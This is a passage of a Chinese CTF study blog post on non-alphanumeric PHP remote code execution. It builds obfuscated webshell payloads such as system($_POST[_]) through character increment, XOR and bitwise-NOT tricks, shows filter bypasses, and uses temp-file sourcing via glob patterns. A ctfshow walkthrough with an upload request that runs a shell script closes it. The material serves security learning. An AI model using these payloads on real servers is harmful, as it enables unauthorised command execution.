+<h3 id="自增"><a href="#自增" class="headerlink" title="++自增"></a><code>++</code>自增</h3><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p>
+<p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
+<p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
+<p><img src="https://s2.loli.net/2023/11/18/32DfL9smSGYbqzE.png" alt="image.png"></p>
+<p>故有payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/HL68pxnvTZBG2ac.png" alt="20200805165424-430e5c2c-d6f9-1"></p>
+<h2 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h2><p>PHP7中新增了函数动态调用：定义一个函数后，可以将函数名或者字符串赋值给一个变量；最后使用变量名代替函数名动态调用函数即可。比如，动态调用，可以用两种方法动态调用<code>md5()</code>函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;md5&#x27;</span>)(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="string">&#x27;md5&#x27;</span>;<span class="variable">$func</span>(<span class="string">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/1n3odWxJaLKFVPN.png" alt="image-20231115164947854"></p>
+<p>有了函数动态调用，就可以更方便的进行异或和取反操作了。</p>
+<h3 id="异或-1"><a href="#异或-1" class="headerlink" title="异或"></a>异或</h3><p>可以利用异或脚本，获取任意想要的字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;<span class="comment">//想要异或得到的字符串</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>演示：</p>
+<p>使用异或脚本获取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo:%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span><br><span class="line">(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)()//相当于(&#x27;phpinfo&#x27;)()，执行了phpinfo()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/D5TbSzqZkdflN3h.png" alt="image-20231115165424122"></p>
+<h3 id="取反-1"><a href="#取反-1" class="headerlink" title="取反"></a>取反</h3><p>可以利用取反脚本，获取任意想要的字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;<span class="comment">//想要取反的字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;~&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(~<span class="variable">$a</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo &quot;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>演示：</p>
+<p>使用取反脚本获取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phpinfo:~%8F%97%8F%96%91%99%90</span><br><span class="line">system:~%8c%86%8c%8b%9a%92</span><br><span class="line">whoami:~%88%97%90%9e%92%96</span><br><span class="line">//可以得到</span><br><span class="line">system(&#x27;whoami&#x27;):(~%8c%86%8c%8b%9a%92)(~%88%97%90%9e%92%96)//相当于(&#x27;system&#x27;)(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/s2IMFQfh4tYVXeU.png" alt="image-20231115170055796"></p>
+<p>注意：</p>
+<p><code>eval</code>和<code>echo</code>不是PHP函数，不能被拼接调用或者动态调用。</p>
+<p><code>assert</code>在php5中是函数，可以拼接调用；但在php7.1中不是函数，就和<code>eval</code>一样了。</p>
+<p>用汉字取反：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]; <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; <span class="comment">//arrayarray</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>); <span class="comment">//$_=(array==arrayarray) false 0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>); <span class="comment">//$__=(array==array) true 1</span></span><br><span class="line"><span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>]; <span class="comment">//system</span></span><br><span class="line"><span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>]; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$$____</span>[_]); <span class="comment">//system($_POST[_]);</span></span><br><span class="line"><span class="comment">//写在一行，得到payload：system($_POST[_])</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];<span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];<span class="variable">$___</span>(<span class="variable">$$____</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<h2 id="各种过滤和绕过"><a href="#各种过滤和绕过" class="headerlink" title="各种过滤和绕过"></a>各种过滤和绕过</h2><h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了<code>_</code></h3><p>在我们上面的例子中，<code>_</code>的主要用途就是在构造变量。但其实最简便的方法里面，我们可以完全不用<code>_</code>，这里给出一个例子。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析下这个Payload，<code>?&gt;</code>闭合了eval自带的<code>&lt;?</code>标签。接下来使用了短标签。<code>&#123;&#125;</code>包含的PHP代码可以被执行，<code>~&quot;%a0%b8%ba%ab&quot;</code>为<code>&quot;_GET&quot;</code>，通过反引号进行shell命令执行。最后我们只要GET传参<code>%a0</code>即可执行命令。</p>
+<p><img src="https://s2.loli.net/2023/11/18/w2jpKGTMUrkmBSx.png" alt="20200805165502-59635bd0-d6f9-1"></p>
+<h3 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了;"></a>过滤了<code>;</code></h3><p>分号我们只是用在结束PHP语句上，我们只要把所有的PHP语句改成短标签形式，就可以不使用<code>;</code>了。</p>
+<h3 id="过滤了-2"><a href="#过滤了-2" class="headerlink" title="过滤了$"></a>过滤了<code>$</code></h3><p>过滤了<code>$</code>的影响是我们彻底不能构造变量了。</p>
+<h4 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h4><p>在PHP7中，我们可以使用<code>($a)()</code>这种方法来执行命令。</p>
+<p>这里我使用<code>call_user_func()</code>来举例(不使用<code>assert()</code>的原因上面已经解释过)。<br>我构造了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">93</span>%<span class="number">93</span>%a0%<span class="number">8</span>a%<span class="number">8</span>c%<span class="number">9</span>a%<span class="number">8</span>d%a0%<span class="number">99</span>%<span class="number">8</span>a%<span class="number">91</span>%<span class="number">9</span>c(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>,~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>e%<span class="number">92</span>%<span class="number">96</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>其中<code>~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c</code>是”<code>call_user_func</code>“，<code>~%8c%86%8c%8b%9a%92</code>是”<code>system</code>“，<code>~%88%97%90%9e%92%96</code>是”<code>whoami</code>“。</p>
+<p>或者我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<h4 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h4><p>开头先贴一篇P神的文章：</p>
+<p>接下来是自我总结的，实在不行再去看看原文。</p>
+<p>php5并不支持php7这种表达方式。</p>
+<p>先写两个有趣的Linux shell知识点：</p>
+<ul>
+<li>shell下可以利用 <code>.</code> 来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ul>
+<p>先贴wp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="构造原理："><a href="#构造原理：" class="headerlink" title="构造原理："></a>构造原理：</h5><h6 id=""><a href="#" class="headerlink" title="&lt;?= ?&gt;"></a><code>&lt;?= ?&gt;</code></h6><p>在php中，<code>&lt;? ?&gt;</code>称为短标签，<code>&lt;?php ?&gt;</code>称为长标签。修改PHP.ini文件配置 <code>short_open_tag = On</code> 才可使用短标签。php5.4.0以后， <code>&lt;?= </code>总是可代替 <code>&lt;? echo</code>。</p>
+<h6 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;&#96;"></a>反引号&#96;&#96;</h6><p>在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。</p>
+<h6 id="-1"><a href="#-1" class="headerlink" title="."></a><code>.</code></h6><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
+<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
+<h6 id="加号"><a href="#加号" class="headerlink" title="加号 +"></a>加号 <code>+</code></h6><p>URL编码中空格为<code>%20</code>，<code>+</code>表示为<code>%2B</code>。然而url中<code>+</code>也可以表示空格，要表示<code>+</code>号必须得用<code>%2B</code>。</p>
+<h6 id="匹配文件名"><a href="#匹配文件名" class="headerlink" title="匹配文件名"></a>匹配文件名</h6><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，在linux系统下，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
+<p><code>*</code>星号，匹配任何字符，<code>?</code> 问号，匹配任意一个字符</p>
+<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
+<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
+<p><img src="https://s2.loli.net/2023/11/18/wlA7FbxYuyGpiMs.png" alt="img"></p>
+<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
+<p><img src="https://s2.loli.net/2023/11/18/1MuRev5ANV6BGSm.png" alt="image.png"></p>
+<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
+<p>我们可以利用<code>[@-[]</code>来表示大写字母：</p>
+<p><img src="https://s2.loli.net/2023/11/18/TR3CqlYkZm92UK4.png" alt="image.png"></p>
+<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
+<p>发送数据包如下（在burp伪造上传）：</p>
+<p><img src="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87.png" alt="image.png"></p>
+<p>成功执行任意命令。</p>
+<h5 id="小小例题"><a href="#小小例题" class="headerlink" title="小小例题"></a>小小例题</h5><p>[ctfshow] 红包题第二弹</p>
+<p>点开一看什么也没有</p>
+<p><img src="https://s2.loli.net/2023/11/18/N2slPLT4Xwphk1W.png" alt="image-20231118221512566"></p>
+<p>惯例先查看源代码，发现hint</p>
+<p><img src="https://s2.loli.net/2023/11/18/4MFmWbe3Ix2JSAn.png" alt="image-20231118221556502"></p>
+<p>GET任意cmd，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计，要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等，可惜不能用p神匹配大写的方法</p>
+<p>但是我们知道临时文件存放地址在tmp目录，且以php开头，恰好本题没有过滤p</p>
+<p>故我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们还要伪造上传，以上请求头修改了3个地方：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"> </span><br><span class="line">#! /bin/sh</span><br><span class="line"> </span><br><span class="line">ls /</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/19/hTQJEnGds5X6c83.png" alt="屏幕截图 2023-11-19 083136"></p>
+<p>发现<code>flag.txt</code>，将<code>ls /</code>改为<code>cat flag.txt</code></p>
+<p><img src="https://s2.loli.net/2023/11/19/RLoFs8nHp13V5TU.png" alt="屏幕截图 2023-11-19 083203"></p>
+<p><strong>Content-Type</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>(默认值) ：上传键值对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>上传文件</p>
+<p><strong>boundary</strong></p>
+<p>boundary为边界分隔符</p>
+<pre><code>文件开始标记：-----------------------------10242300956292313528205888
+
+文件结束标记：-----------------------------10242300956292313528205888--
+
+其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。
+</code></pre>
+<p><strong>文件内容</strong></p>
+<p><code>#! /bin/sh </code>指定命令解释器，<code>#!</code>是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：<code>sh,csh,ksh,tcsh。</code>首先用命令 <code>ls / </code> 来查看服务器根目录有哪些文件，发现有<code>flag.txt</code>，然后再用 <code>cat /flag.txt</code> 即可。</p>
+<p>当然，也可以构造一个前端上传的html页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;h1&gt;Welcome to Tutorials Point&lt;/h1&gt;</span><br><span class="line">   &lt;form action=&quot;http://13f4152e-6ad9-4586-b8d0-c26c0c2c2a45.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;file&quot; name=&quot;uploadedFile&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传一个txt文档，用burp抓包，在改文件内容和cmd的值就行了</p>
+<p><img src="https://s2.loli.net/2023/11/19/xVkav6YIHjKfgXN.png" alt="image-20231119172006358"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="next" title="无参数RCE学习记录">
+      无参数RCE学习记录 <i class="fa fa-chevron-right"></i>
